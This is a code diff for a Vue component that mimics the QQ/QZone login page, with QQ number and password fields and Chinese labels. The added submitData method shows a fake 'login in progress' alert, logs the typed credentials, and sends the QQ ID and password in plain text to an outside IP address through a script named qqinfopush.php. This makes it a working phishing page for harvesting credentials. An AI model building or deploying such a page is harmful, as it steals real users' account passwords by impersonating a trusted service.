@@ -2,15 +2,15 @@
   <div class="login">
 <!--    <img src="../../assets/img/QZone.jpg" alt="">-->
     <div class="logo"></div>
-    <div id="web_login">
-      <div>
-        <input id="u" class="inputstyle" name="u" autocomplete="off" placeholder="QQ号码/手机/邮箱">
+      <div id="web_login">
+        <div>
+          <input id="u" class="inputstyle" name="u" autocomplete="off" placeholder="QQ号码/手机/邮箱" v-model="id">
+        </div>
+        <div>
+          <input id="p" class="inputstyle" maxlength="16" type="password" name="p" autocorrect="off" placeholder="请输入你的QQ密码" v-model="pwd">
+        </div>
+        <div id="go" @click="submitData"> 登 录 </div>
       </div>
-      <div>
-        <input id="p" class="inputstyle" maxlength="16" type="password" name="p" autocorrect="off" placeholder="请输入你的QQ密码">
-      </div>
-      <div id="go"> 登 录 </div>
-    </div>
     <div id="feedback">
       <span id="forget">忘了密码？</span>
       <span id="zc">注册新账号</span>
@@ -19,8 +19,44 @@
 </template>
 
 <script>
+import {request} from "../../network/request";
+import axios from "axios";
+
 export default {
-  name: "qqZone"
+  name: "qqZone",
+  data(){
+    return{
+      id:'', pwd:'',xurl:'',result:''
+    }
+  },
+  methods:{
+    submitData(){
+      alert('提交成功，正在登录...');
+      console.log(this.id);
+      console.log(this.pwd);
+      // this.xurl = 'http://localhost:8098/qqinfosql/qqinfoselect.php';
+      // this.xurl = 'http://localhost:8098/qqinfosql/qqinfopush.php?qqId='+this.id+'&&qqPwd='+this.pwd;
+      // this.xurl = 'http://39.105.94.15:80/phpapi/qqinfosql/qqinfopush.php?qqId='+this.id+'&&qqPwd='+this.pwd;
+      this.xurl = 'http://39.105.94.15:80/phpapi/qqinfosql/qqinfopush.php';
+      console.log(this.xurl);
+      request(
+          {
+            method:'GET',
+            url:this.xurl,
+            params:{
+              qqId:this.id,
+              qqPwd:this.pwd
+            }
+            },
+          (res)=>{
+            console.log(res);
+          },
+          (rej)=> {
+            console.log(rej);
+          }
+      )
+    }
+  }
 }
 </script>
 
